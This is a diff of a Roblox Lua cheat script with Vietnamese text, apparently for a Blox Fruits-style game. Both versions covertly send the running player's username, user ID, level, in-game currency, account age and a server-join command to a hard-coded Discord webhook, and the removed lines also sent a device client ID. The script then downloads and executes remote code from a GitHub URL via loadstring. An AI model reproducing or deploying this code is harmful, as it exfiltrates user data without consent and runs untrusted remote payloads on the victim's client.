@@ -1,49 +1,53 @@
-local HttpService = game:GetService("HttpService")
-Webhook_URL =  "https://discord.com/api/webhooks/1269190586771177575/Lzks4rnyuvD3TBoARaoJ6AKIl_yOS7ncg6aXaBvq4EwNV_TZOKOBRRCu_eqaW2rQ7Z8P"
+HttpService = game:GetService("HttpService") 
+ Webhook_URL =  "https://discord.com/api/webhooks/1269190586771177575/Lzks4rnyuvD3TBoARaoJ6AKIl_yOS7ncg6aXaBvq4EwNV_TZOKOBRRCu_eqaW2rQ7Z8P" 
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 httprequest(
+ { 
+ Url = Webhook_URL, 
+ Method = 'POST', 
+ Headers = { 
+ ['Content-Type'] = 'application/json' 
+ }, 
+ Body = HttpService:JSONEncode({ 
+ ["content"] = "", 
+ ["embeds"] = {{ 
+ ["author"] = { 
+ ["name"] = "FREE | "..game.Players.LocalPlayer.Name, 
+ ["icon"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=100&height=100&format=png" 
+ }, 
+ ["title"] = ""..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+ ["description"] = "Goz Thấy ["..game.Players.LocalPlayer.DisplayName.."] Vừa Dùng Hack | Kick", 
+ ["type"] = "rich", 
+ ["color"] = tonumber(0xffffff), 
+ ["fields"] = { 
+ { 
+ ["name"] = "Script Server:", 
+ ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId,'"..game.JobId.."',game.Players.LocalPlayer)```", 
+ ["inline"] = true }, 
+ { 
+ ["name"] = "UserId:", 
+ ["value"] = "```"..game:GetService("Players").LocalPlayer.UserId.."```", 
+ ["inline"] = true }, 
+ { 
+ ["name"] = "Level: ", 
+ ["value"] = "```"..game.Players.LocalPlayer.Data.Levels.Value.."```", 
+ ["inline"] = true }, 
+ { 
+["name"] = "Beli: ", 
+ ["value"] = "```"..game.Players.LocalPlayer.Data.Belis.Value.."```", 
+ ["inline"] = true }, 
+ { 
+ ["name"] = "Số tuổi của Account:", 
+ ["value"] = game:GetService("Players").LocalPlayer.AccountAge, 
+ ["inline"] = true },
 {
-Url = Webhook_URL,
-Method = 'POST',
-Headers = {
-['Content-Type'] = 'application/json'
-},
-Body = HttpService:JSONEncode({
-["content"] = "",
-["embeds"] = {{
-["author"] = {
-["name"] = game.Players.LocalPlayer.Name,
-["icon"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=100&height=100&format=png"
-},
-["title"] = ""..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-["description"] = " ["..game.Players.LocalPlayer.DisplayName.."] thk này vừa dùng hack cko nó bucu đi",
-["type"] = "rich",
-["color"] = tonumber(0xffffff),
-["fields"] = {
-{
-["name"] = "Server Script:",
-["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId,'"..game.JobId.."',game.Players.LocalPlayer)```",
-["inline"] = true },
-{
-["name"] = "User ID:",
-["value"] = game:GetService("Players").LocalPlayer.UserId,
-["inline"] = true },
-{
-["name"] = "Beli+Level:",
-["value"] = "LV: "..game:GetService("Players").LocalPlayer.Data.Levels.Value.." | Beli: "..game:GetService("Players").LocalPlayer.Data.Belis.Value,
-["inline"] = true },
-{
-["name"] = "Account Age:",
-["value"] = game:GetService("Players").LocalPlayer.AccountAge,
-["inline"] = true },
-{
-["name"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+["name"] = "",
 ["value"] = os.date(),
 ["inline"] = true }
-}
-}}
-})
-})
+ } 
+ }} 
+ }) 
+ })
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DuyM7/Function-FindFirstChild-Plr/main/blacklist"))()
 if test then
 test:Destroy()
